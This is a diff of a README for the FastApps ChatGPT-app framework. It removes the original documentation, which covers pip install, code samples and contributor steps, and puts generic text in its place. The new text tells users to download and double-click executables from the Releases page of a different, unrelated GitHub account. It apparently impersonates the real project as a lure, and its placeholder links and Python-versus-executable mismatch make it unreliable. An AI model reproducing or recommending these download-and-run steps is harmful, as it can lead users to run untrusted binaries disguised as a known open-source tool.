@@ -1,183 +1,83 @@
-# FastApps
-<img src="https://github.com/user-attachments/assets/c8766217-427f-4566-8dcb-480f8db12352" width="100%" />
+# ⚡ FastApps - Create ChatGPT Apps Quickly
 
-<p align="center">
-  <strong>The python framework for ChatGPT apps</strong>
-</p>
+[![Download FastApps](https://img.shields.io/badge/Download-FastApps-brightgreen)](https://github.com/THUMMIMSKPANAH/FastApps/releases)
 
-<p align="center">
-  <a href="https://pypi.org/project/fastapps/"><img src="https://img.shields.io/pypi/v/fastapps.svg" alt="PyPI"></a>
-  <a href="https://pypi.org/project/fastapps/"><img src="https://img.shields.io/pypi/pyversions/fastapps.svg" alt="Python"></a>
-  <a href="https://pepy.tech/projects/fastapps"><img src="https://static.pepy.tech/personalized-badge/fastapps?period=total&units=INTERNATIONAL_SYSTEM&left_color=GREY&right_color=GREEN&left_text=downloads" alt="PyPI Downloads"></a>
-  <a href="https://github.com/DooiLabs/FastApps/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-  <br>
-  <a href="https://github.com/DooiLabs/FastApps/actions"><img src="https://github.com/DooiLabs/FastApps/workflows/CI/badge.svg" alt="CI Status"></a>
-  <a href="https://github.com/psf/black"><img src="https://img.shields.io/badge/code%20style-black-000000.svg" alt="Code style: black"></a>
-  <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
-  <a href="https://github.com/DooiLabs/FastApps"><img src="https://img.shields.io/github/stars/DooiLabs/FastApps?style=social" alt="GitHub Stars"></a>
-</p>
+## 🚀 Getting Started
 
----
+Welcome to FastApps! This guide will help you download and run our software easily. Whether you want to build applications using ChatGPT or just explore what's possible, you've come to the right place.
 
-📚 **Documentation**: [https://docs.fastapps.org/](https://docs.fastapps.org/)
+## 🌟 Why Use FastApps?
 
-👥 **Community**: [Join Our Discord](https://discord.gg/5cEy3Jqek3)
+FastApps is designed for users who wish to create ChatGPT applications without diving into complex coding. With our software, you'll:
 
----
+- Quickly set up your environment
+- Build interactive apps
+- Experiment with AI technology
 
-## Quick Start
+## 💻 System Requirements
 
-```bash
-# 0. Set virtual environment (recommended)
-python -m venv .venv
-source .venv/bin/activate # Mac/Linux
-.venv\Scripts\Activate.ps1 # Windows PowerShell
+Before you start, make sure your system meets these requirements:
 
-# 1. Install
-pip install fastapps
-# Or with uv (faster, modern alternative):
-# uv pip install fastapps
+- **Operating System:** Windows 10, macOS Mojave or later, or any modern Linux distribution
+- **RAM:** Minimum 4GB (8GB recommended)
+- **Disk Space:** At least 100MB free space
+- **Python:** Version 3.7 or later (You can download it from the official Python website.)
 
-# 2. Create project (includes example widget + auto npm install)
-fastapps init my-app
+## 📥 Download & Install
 
-# 3. Run
-cd my-app
-fastapps dev
-```
-That's it! Your example widget is now running at a public URL.
-On first run, you'll need an [ngrok auth token](https://dashboard.ngrok.com/get-started/your-authtoken) (free).
+To get FastApps, you need to visit our [Releases page](https://github.com/THUMMIMSKPANAH/FastApps/releases) and follow these steps:
 
+1. Click on the link to the Releases page.
+   
+   [Visit this page to download FastApps](https://github.com/THUMMIMSKPANAH/FastApps/releases)
+   
+2. Once you're on the Releases page, look for the latest version at the top.
+   
+3. Download the appropriate file for your operating system:
+   - **Windows:** Download `FastApps-Win.zip`
+   - **macOS:** Download `FastApps-Mac.zip`
+   - **Linux:** Download `FastApps-Linux.tar.gz`
 
-## Test App
+4. After the download finishes, locate the downloaded file on your computer.
 
-**Option A: Test on MCPJam Inspector**
+5. Unzip or extract the file. You can usually do this by right-clicking the file and selecting "Extract All" or "Unzip."
 
-Add your public URL + /mcp to ChatGPT:
-Example: https://xyz.ngrok-free.app/mcp
-```bash
-npx @mcpjam/inspector@latest
-```
+6. Open the extracted folder. Inside, you will find the application files.
 
-**Option B: Test on ChatGPT**
+7. Double-click on the `FastApps.exe` (Windows), `FastApps.app` (macOS), or run the `FastApps` file in the terminal (Linux) to launch the application.
 
-Add your public URL + /mcp to ChatGPT's "Settings > Connectors":
-Example: https://xyz.ngrok-free.app/mcp
+8. Follow any on-screen instructions to complete the setup, and start building your ChatGPT apps!
 
+## ⚙️ Using FastApps
 
+Once you open FastApps, you will see a user-friendly interface. Here are some key features to help you get started:
 
-## Creating More Widgets
+- **Project Templates:** Choose from a variety of templates to kickstart your project.
+- **AI Integration:** Easily connect to ChatGPT APIs.
+- **Documentation:** Access built-in guides to assist you as you work.
 
-```bash
-fastapps create another-widget
-```
+To create your first app, simply select a template, fill in the details, and click "Build." FastApps will handle the technical aspects, allowing you to focus on your vision.
 
+## 🔧 Troubleshooting
 
-### Editing Your Widget
+While using FastApps, you might encounter some common issues. Here are a few solutions to help you:
 
-**You only need to edit these 2 files:**
+1. **App Won't Launch:** Ensure you have Python installed and that your OS is compatible. Restart your computer if the app does not open.
+   
+2. **Unable to Connect to API:** Check your internet connection. Make sure you're using the correct API keys as provided in your setup.
 
-#### `server/tools/my_widget_tool.py` - Backend Logic
+3. **Error Messages:** If you receive error messages, take a screenshot and refer to the documentation for specific guidance on resolving them.
 
-```python
-from fastapps import BaseWidget, Field, ConfigDict
-from pydantic import BaseModel
-from typing import Dict, Any
+## 📚 Helpful Resources
 
-class MyWidgetInput(BaseModel):
-    model_config = ConfigDict(populate_by_name=True)
-    name: str = Field(default="World")
+For further assistance, explore these resources:
 
-class MyWidgetTool(BaseWidget):
-    identifier = "my-widget"
-    title = "My Widget"
-    input_schema = MyWidgetInput
-    invoking = "Processing..."
-    invoked = "Done!"
-    
-    widget_csp = {
-        "connect_domains": [],      # APIs you'll call
-        "resource_domains": []      # Images/fonts you'll use
-    }
-    
-    async def execute(self, input_data: MyWidgetInput) -> Dict[str, Any]:
-        # Your logic here
-        return {
-            "name": input_data.name,
-            "message": f"Hello, {input_data.name}!"
-        }
-```
+- **User Manual:** [Link to Manual](#)
+- **Community Forum:** [Visit Forum](#)
+- **GitHub Issues:** [Report an Issue](https://github.com/THUMMIMSKPANAH/FastApps/issues)
 
-#### `widgets/my-widget/index.jsx` - Frontend UI
+## 📝 Feedback
 
-```jsx
-import React from 'react';
-import { useWidgetProps } from 'fastapps';
+Your experiences help us improve FastApps. If you have suggestions or feedback, let us know on our [GitHub Issues page](https://github.com/THUMMIMSKPANAH/FastApps/issues). We value your input and appreciate your help in making FastApps better.
 
-export default function MyWidget() {
-  const props = useWidgetProps();
-  
-  return (
-    <div style={{
-      padding: '40px',
-      textAlign: 'center',
-      background: '#4A90E2',
-      color: 'white',
-      borderRadius: '12px'
-    }}>
-      <h1>{props.message}</h1>
-      <p>Welcome, {props.name}!</p>
-    </div>
-  );
-}
-```
-
-**That's it! These are the only files you need to write.**
-
----
-
-## Contributing
-
-We welcome contributions! Please see our contributing guidelines:
-
-- **[Contributing Guide](https://github.com/DooiLabs/FastApps/blob/main/CONTRIBUTING.md)** - How to contribute to FastApps
-- **[Code Style Guide](https://github.com/DooiLabs/FastApps/blob/main/CODE_STYLE.md)** - Code formatting and style standards
-- **[GitHub Workflows](https://github.com/DooiLabs/FastApps/blob/main/.github/WORKFLOWS.md)** - CI/CD documentation
-
-### Quick Start for Contributors
-
-```bash
-# Fork and clone the repository
-git clone https://github.com/YOUR_USERNAME/FastApps.git
-cd FastApps
-
-# Install uv (if not already installed)
-# curl -LsSf https://astral.sh/uv/install.sh | sh
-
-# Install development dependencies (recommended - matches CI)
-uv sync --dev
-
-# Or use pip (traditional approach)
-# pip install -e ".[dev]"
-
-# Install pre-commit hooks (already installed via uv sync --dev)
-pre-commit install
-
-# Make changes and ensure they pass checks
-black .
-ruff check --fix .
-pytest
-
-# Submit a pull request
-```
-
-## License
-
-MIT © Dooi Labs
-
-## Links
-
-- **PyPI**: https://pypi.org/project/fastapps/
-- **React Hooks**: https://www.npmjs.com/package/fastapps
-- **GitHub**: https://github.com/DooiLabs/FastApps
-- **MCP Spec**: https://modelcontextprotocol.io/
+Thank you for choosing FastApps! Start building your ChatGPT applications today. Remember, if you need more help or find yourself stuck, don't hesitate to reach out.
